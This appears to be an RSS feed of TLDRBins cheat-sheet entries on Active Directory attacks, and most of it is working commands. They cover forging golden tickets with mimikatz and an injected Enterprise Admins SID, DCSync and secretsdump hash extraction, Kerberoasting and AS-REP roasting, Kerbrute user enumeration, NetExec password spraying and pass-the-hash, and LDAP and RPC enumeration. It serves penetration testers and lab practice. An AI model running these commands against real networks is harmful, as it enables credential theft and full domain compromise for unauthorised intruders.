channel.title: Active Directory on TLDRBins
channel.description: Recent content in Active Directory on TLDRBins

item.title: Abuse Parent Child Domain Trusts
item.description: Privesc from DA to EA 1. Check direction and target Get-ADTrust -Filter * # Or nltest /domain_trusts # Or ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID ./mimikatz.exe 'lsadump::trust' 'exit' 3. Get krbtgt hash of current domain ./mimikatz.exe 'lsadump::dcsync /all /csv' 'exit' 4. Forge a golden ticket # Append '-519' to target domain SID ./mimikatz.exe 'kerberos::golden /user:Administrator /rc4:<HASH> /domain:CURRENT.EXAMPLE.COM /sid:<CURRENT_DOMAIN_SID> /sids:<TARGET_DOMAIN_SID>-519 /ticket:c:\windows\tasks\ticket.kirbi' 'exit' Note: May need to try different high value hashes

item.title: Kerberoasting
item.description: AS_REP Roasting impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10 Kerberoasting (From Linux) faketime -f +8h impacket-GetNPUsers -request 'example.com/user:password' -dc-ip 10.10.11.10 -save -outputfile GetUserSPNs.txt Note: Times skew have to be within 5 minutes in kerberos Kerberoasting (From Windows) .\rubeus.exe kerberoast /creduser:example.com\username /credpassword:password

item.title: Kerberos
item.description: Kerbrute Download kerbrute kerbrute userenum --domain example.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.11.10 Generate Kerberos Ticket (From Linux) sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to `/etc/hosts` 10.10.11.10 example.com dc01.example.com dc01 # Step 2: Add domain controller as a DNS server to `/etc/resolv.conf` nameserver 10.10.11.10 # Step 3: Edit `/etc/krb5.conf` [libdefaults] default_realm = EXAMPLE.COM [realms] example.com = { kdc = dc01.example.com:88 admin_serve = dc01.example.com default_domain = example.com } [domain_realm] .

item.title: LDAP
item.description: Enum # Using nmap script sudo nmap -p 389 --script ldap-search 10.10.11.10 # Using ldapdomaindump (With Creds) ldapdomaindump -u 'example.com\username' -p 'passowrd' 10.10.11.10 -o ./ldap # Get domain base ldapsearch -x -H ldap://10.10.11.10 -s base namingcontexts # Get all from domain ldapsearch -x -H ldap://10.10.11.10 -b 'DC=EXAMPLE,DC=COM' # Just get a class (e.g. person) ldapsearch -x -H ldap://10.10.11.10 -b 'DC=EXAMPLE,DC=COM' '(objectClass=person)' # With creds (e.g. john.appleseed) ldapsearch -x -H ldap://10.

item.title: NetExec (nxc)
item.description: nxc Download nxc Basic Commands # Single user and password nxc smb 10.10.11.10 -u username -p password # Single user and password (Active Directory) nxc smb -u username -p password -d domain -dc-ip 10.10.11.10 # Multiple users or passwords nxc smb -u usernames.txt -p password -d domain -dc-ip 10.10.11.10 --continue-on-success # With LM Hash:NT Hash nxc smb 10.10.11.10 -u username -H LM_hash:NT_hash Supported protocols +----------------------------------------------------------+ | ftp | ldap | mssql | rdp | smb | ssh | vnc | winrm | wmi | +----------------------------------------------------------+

item.title: RPC
item.description: RPC rpcclient # Connect without creds rpcclient -U '' -N 10.10.11.10 # Connect with creds rpcclient -U domain/username%password 10.10.11.10 # Inline execute command rpcclient -U domain/username%password 10.10.11.10 -c 'querydispinfo' Basic Commands # General info querydispinfo # List of users enumdomusers # List of groups enumdomgroups # Query group by rid querygroup RID # Query group member by rid querygroupmem RID # Query user by rid queryuser RID # Look up a user lookupnames USERNAME # Look up by SID lookupsids SID impacket-lookupsid impacket-lookupsid username:password@10.

item.title: secretsdump
item.description: Impacket Download Impacket secretsdump With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump username:password@10.10.11.10
